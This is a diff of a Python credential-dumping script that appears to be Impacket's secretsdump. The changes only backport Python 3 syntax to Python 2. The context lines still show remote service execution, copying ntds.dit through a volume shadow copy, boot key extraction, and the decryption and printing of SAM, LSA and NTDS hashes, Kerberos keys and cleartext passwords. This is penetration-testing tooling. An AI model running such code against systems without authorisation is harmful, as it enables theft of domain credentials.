@@ -71,8 +71,8 @@ from impacket.ese import ESENT_DB
 from impacket.dcerpc.v5.dtypes import NULL
 
 try:
-    from Cryptodome.Cipher import DES, ARC4, AES
-    from Cryptodome.Hash import HMAC, MD4
+    from Crypto.Cipher import DES, ARC4, AES
+    from Crypto.Hash import HMAC, MD4
 except ImportError:
     logging.critical("Warning: You don't have any crypto installed. You need PyCrypto")
     logging.critical("See http://www.pycrypto.org/")
@@ -444,7 +444,7 @@ class RemoteOperations:
             self.__ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
             self.__ppartialAttrSet['dwVersion'] = 1
             self.__ppartialAttrSet['cAttrs'] = len(NTDSHashes.ATTRTYP_TO_ATTID)
-            for attId in list(NTDSHashes.ATTRTYP_TO_ATTID.values()):
+            for attId in NTDSHashes.ATTRTYP_TO_ATTID.values():
                 self.__ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(self.__prefixTable , attId))
         request['pmsgIn']['V8']['pPartialAttrSet'] = self.__ppartialAttrSet
         request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(self.__prefixTable)
@@ -464,7 +464,7 @@ class RemoteOperations:
                                                                        samr.USER_SERVER_TRUST_ACCOUNT |\
                                                                        samr.USER_INTERDOMAIN_TRUST_ACCOUNT,
                                                     enumerationContext=enumerationContext)
-        except DCERPCException as e:
+        except DCERPCException, e:
             if str(e).find('STATUS_MORE_ENTRIES') < 0:
                 raise
             resp = e.get_packet()
@@ -520,7 +520,7 @@ class RemoteOperations:
             if account.startswith('.\\'):
                 account = account[2:]
             return account
-        except Exception as e:
+        except Exception, e:
             logging.error(e)
             return None
 
@@ -592,7 +592,7 @@ class RemoteOperations:
                 scmr.hRCloseServiceHandle(self.__scmr, self.__serviceHandle)
                 scmr.hRCloseServiceHandle(self.__scmr, self.__scManagerHandle)
                 rpc.disconnect()
-            except Exception as e:
+            except Exception, e:
                 # If service is stopped it'll trigger an exception
                 # If service does not exist it'll trigger an exception
                 # So. we just wanna be sure we delete it, no need to 
@@ -626,7 +626,7 @@ class RemoteOperations:
 
         bootKey = unhexlify(bootKey)
 
-        for i in range(len(bootKey)):
+        for i in xrange(len(bootKey)):
             self.__bootKey += bootKey[transforms[i]]
 
         logging.info('Target system bootKey: 0x%s' % hexlify(self.__bootKey))
@@ -653,7 +653,7 @@ class RemoteOperations:
         return True
 
     def __retrieveHive(self, hiveName):
-        tmpFileName = ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.tmp'
+        tmpFileName = ''.join([random.choice(string.letters) for _ in range(8)]) + '.tmp'
         ans = rrp.hOpenLocalMachine(self.__rrp)
         regHandle = ans['phKey']
         try:
@@ -677,7 +677,7 @@ class RemoteOperations:
         return self.__retrieveHive('SECURITY')
 
     def __executeRemote(self, data):
-        self.__tmpServiceName = ''.join([random.choice(string.ascii_letters) for _ in range(8)]).encode('utf-16le')
+        self.__tmpServiceName = ''.join([random.choice(string.letters) for _ in range(8)]).encode('utf-16le')
         command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + \
                   self.__shell + self.__batchFile
         command += ' & ' + 'del ' + self.__batchFile
@@ -705,7 +705,7 @@ class RemoteOperations:
             try:
                 self.__smbConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                 break
-            except Exception as e:
+            except Exception, e:
                 if tries > 30:
                     # We give up
                     raise Exception('Too many tries trying to list vss shadows')
@@ -773,7 +773,7 @@ class RemoteOperations:
             shouldRemove = False
 
         # Now copy the ntds.dit to the temp directory
-        tmpFileName = ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.tmp'
+        tmpFileName = ''.join([random.choice(string.letters) for _ in range(8)]) + '.tmp'
 
         self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))
 
@@ -982,7 +982,7 @@ class SAMHashes(OfflineRegistry):
 
             answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash), hexlify(ntHash))
             self.__itemsFound[rid] = answer
-            print(answer)
+            print answer
 
     def export(self, fileName):
         if len(self.__itemsFound) > 0:
@@ -1141,7 +1141,7 @@ class LSASecrets(OfflineRegistry):
                 domainLong = plainText[:self.__pad(record['FullDomainLength'])].decode('utf-16le')
                 answer = "%s:%s:%s:%s:::" % (userName, hexlify(encHash), domainLong, domain)
                 self.__cachedItems.append(answer)
-                print(answer)
+                print answer
 
     def __printSecret(self, name, secretItem):
         # Based on [MS-LSAD] section 3.1.1.4
@@ -1219,7 +1219,7 @@ class LSASecrets(OfflineRegistry):
                 secret = "$MACHINE.ACC: %s:%s" % (hexlify(ntlm.LMOWFv1('','')), hexlify(md4.digest()))
 
         if secret != '':
-            print(secret)
+            print secret
             self.__secretItems.append(secret)
         else:
             # Default print, hexdump
@@ -1332,7 +1332,7 @@ class NTDSHashes:
         0xffffff74:'rc4_hmac',
     }
 
-    INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.items())
+    INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.iteritems())
 
     SAM_NORMAL_USER_ACCOUNT = 0x30000000
     SAM_MACHINE_ACCOUNT     = 0x30000001
@@ -1531,7 +1531,7 @@ class NTDSHashes:
                 try:
                     attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                     LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
-                except Exception as e:
+                except Exception, e:
                     logging.debug('Failed to execute OidFromAttid with error %s' % e)
                     # Fallbacking to fixed table and hope for the best
                     attId = attr['attrTyp']
@@ -1586,7 +1586,7 @@ class NTDSHashes:
                         data = data[len(keyDataNew):]
                         keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]
 
-                        if  keyDataNew['KeyType'] in self.KERBEROS_TYPE:
+                        if  self.KERBEROS_TYPE.has_key(keyDataNew['KeyType']):
                             answer =  "%s:%s:%s" % (userName, self.KERBEROS_TYPE[keyDataNew['KeyType']],hexlify(keyValue))
                         else:
                             answer =  "%s:%s:%s" % (userName, hex(keyDataNew['KeyType']),hexlify(keyValue))
@@ -1660,7 +1660,7 @@ class NTDSHashes:
             answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash), hexlify(NTHash))
             if self.__pwdLastSet is True:
                 answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
-            print(answer)
+            print answer
 
             if outputFile is not None:
                 self.__writeOutput(outputFile, answer + '\n')
@@ -1701,7 +1701,7 @@ class NTDSHashes:
                     answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHash))
                     if outputFile is not None:
                         self.__writeOutput(outputFile, answer + '\n')
-                    print(answer)
+                    print answer
         else:
             replyVersion = 'V%d' %record['pdwOutVersion']
             logging.debug('Decrypting hash for user: %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
@@ -1716,7 +1716,7 @@ class NTDSHashes:
                 try:
                     attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                     LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
-                except Exception as e:
+                except Exception, e:
                     logging.debug('Failed to execute OidFromAttid with error %s, fallbacking to fixed table' % e)
                     # Fallbacking to fixed table and hope for the best
                     attId = attr['attrTyp']
@@ -1794,7 +1794,7 @@ class NTDSHashes:
             answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash), hexlify(NTHash))
             if self.__pwdLastSet is True:
                 answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
-            print(answer)
+            print answer
 
             if outputFile is not None:
                 self.__writeOutput(outputFile, answer + '\n')
@@ -1808,7 +1808,7 @@ class NTDSHashes:
                         lmhash = hexlify(LMHashHistory)
 
                     answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHashHistory))
-                    print(answer)
+                    print answer
                     if outputFile is not None:
                         self.__writeOutput(outputFile, answer + '\n')
 
@@ -1827,7 +1827,7 @@ class NTDSHashes:
                 # DRSUAPI method, checking whether target is a DC
                 try:
                     self.__remoteOps.connectSamr(self.__remoteOps.getMachineNameAndDomain()[1])
-                except Exception as e:
+                except Exception, e:
                     logging.debug('Exiting NTDSHashes.dump() because %s' % e)
                     # Target's not a DC
                     return
@@ -1863,7 +1863,7 @@ class NTDSHashes:
                         self.__decryptHash(record, outputFile=hashesOutputFile)
                         if self.__justNTLM is False:
                             self.__decryptSupplementalInfo(record, None, keysOutputFile, clearTextOutputFile)
-                    except Exception as e:
+                    except Exception, e:
                         # import traceback
                         # print traceback.print_exc()
                         try:
@@ -1891,7 +1891,7 @@ class NTDSHashes:
                             self.__decryptHash(record, outputFile=hashesOutputFile)
                             if self.__justNTLM is False:
                                 self.__decryptSupplementalInfo(record, None, keysOutputFile, clearTextOutputFile)
-                    except Exception as e:
+                    except Exception, e:
                         # import traceback
                         # print traceback.print_exc()
                         try:
@@ -1913,7 +1913,7 @@ class NTDSHashes:
                 # Yes
                 try:
                     resumeFile = open(self.__savedSessionFile, 'rwb+')
-                except Exception as e:
+                except Exception, e:
                     raise Exception('Cannot open resume session file name %s' % str(e))
                 resumeSid = resumeFile.read().strip('\n')
                 logging.info('Resuming from SID %s, be patient' % resumeSid)
@@ -1924,13 +1924,13 @@ class NTDSHashes:
                 resumeSid = None
                 # We do not create a resume file when asking for a single user
                 if self.__justUser is None:
-                    tmpName = 'sessionresume_%s' % ''.join([random.choice(string.ascii_letters) for i in range(8)])
+                    tmpName = 'sessionresume_%s' % ''.join([random.choice(string.letters) for i in range(8)])
                     logging.debug('Session resume file will be %s' % tmpName)
                     # Creating the resume session file
                     try:
                         resumeFile = open(tmpName, 'wb+')
                         self.__resumeSessionFile = tmpName
-                    except Exception as e:
+                    except Exception, e:
                         raise Exception('Cannot create resume session file %s' % str(e))
 
             if self.__justUser is not None:
@@ -1960,7 +1960,7 @@ class NTDSHashes:
                         self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
                             'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
 
-                except Exception as e:
+                except Exception, e:
                     #import traceback
                     #traceback.print_exc()
                     logging.error("Error while processing user!")
@@ -2026,7 +2026,7 @@ class NTDSHashes:
                                 self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
                                     'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
 
-                        except Exception as e:
+                        except Exception, e:
                             #import traceback
                             #traceback.print_exc()
                             logging.error("Error while processing user!")
@@ -2056,8 +2056,8 @@ class NTDSHashes:
             else:
                 logging.info('Kerberos keys grabbed')
 
-            for itemKey in list(self.__kerberosKeys.keys()):
-                print(itemKey)
+            for itemKey in self.__kerberosKeys.keys():
+                print itemKey
 
         # And finally the cleartext pwds
         if len(self.__clearTextPwds) > 0:
@@ -2066,8 +2066,8 @@ class NTDSHashes:
             else:
                 logging.info('ClearText passwords grabbed')
 
-            for itemKey in list(self.__clearTextPwds.keys()):
-                print(itemKey)
+            for itemKey in self.__clearTextPwds.keys():
+                print itemKey
 
         # Closing output file
         if self.__outputFileName is not None:
@@ -2080,7 +2080,7 @@ class NTDSHashes:
     def __writeOutput(cls, fd, data):
         try:
             fd.write(data)
-        except Exception as e:
+        except Exception, e:
             logging.error("Error writing entry, skippingi (%s)" % str(e))
             pass
 
@@ -2110,7 +2110,7 @@ class LocalOperations:
 
         tmpKey = unhexlify(tmpKey)
 
-        for i in range(len(tmpKey)):
+        for i in xrange(len(tmpKey)):
             bootKey += tmpKey[transforms[i]]
 
         logging.info('Target system bootKey: 0x%s' % hexlify(bootKey))
@@ -2202,7 +2202,7 @@ class DumpSecrets:
                         bootKey             = self.__remoteOps.getBootKey()
                         # Let's check whether target system stores LM Hashes
                         self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
-                except Exception as e:
+                except Exception, e:
                     self.__canProcessSAMLSA = False
                     logging.error('RemoteOperations failed: %s' % str(e))
 
@@ -2218,7 +2218,7 @@ class DumpSecrets:
                     self.__SAMHashes.dump()
                     if self.__outputFileName is not None:
                         self.__SAMHashes.export(self.__outputFileName)
-                except Exception as e:
+                except Exception, e:
                     logging.error('SAM hashes extraction failed: %s' % str(e))
 
                 try:
@@ -2234,7 +2234,7 @@ class DumpSecrets:
                     self.__LSASecrets.dumpSecrets()
                     if self.__outputFileName is not None:
                         self.__LSASecrets.exportSecrets(self.__outputFileName)
-                except Exception as e:
+                except Exception, e:
                     logging.error('LSA hashes extraction failed: %s' % str(e))
 
             # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
@@ -2253,7 +2253,7 @@ class DumpSecrets:
                                            outputFileName=self.__outputFileName, justUser=self.__justUser)
             try:
                 self.__NTDSHashes.dump()
-            except Exception as e:
+            except Exception, e:
                 if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                     # We don't store the resume file if this error happened, since this error is related to lack
                     # of enough privileges to access DRSUAPI.
@@ -2264,14 +2264,14 @@ class DumpSecrets:
                 if self.__useVSSMethod is False:
                     logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
             self.cleanup()
-        except (Exception, KeyboardInterrupt) as e:
+        except (Exception, KeyboardInterrupt), e:
             #import traceback
             #print traceback.print_exc()
             logging.error(e)
             if self.__NTDSHashes is not None:
                 if isinstance(e, KeyboardInterrupt):
                     while True:
-                        answer =  input("Delete resume session file? [y/N] ")
+                        answer =  raw_input("Delete resume session file? [y/N] ")
                         if answer.upper() == '':
                             answer = 'N'
                             break
@@ -2311,7 +2311,7 @@ if __name__ == '__main__':
         # Output is redirected to a file
         sys.stdout = codecs.getwriter('utf8')(sys.stdout)
 
-    print(version.BANNER)
+    print version.BANNER
 
     parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from the remote machine without executing any agent there.")
 
@@ -2408,5 +2408,5 @@ if __name__ == '__main__':
     dumper = DumpSecrets(address, username, password, domain, options)
     try:
         dumper.dump()
-    except Exception as e:
+    except Exception, e:
         logging.error(e)
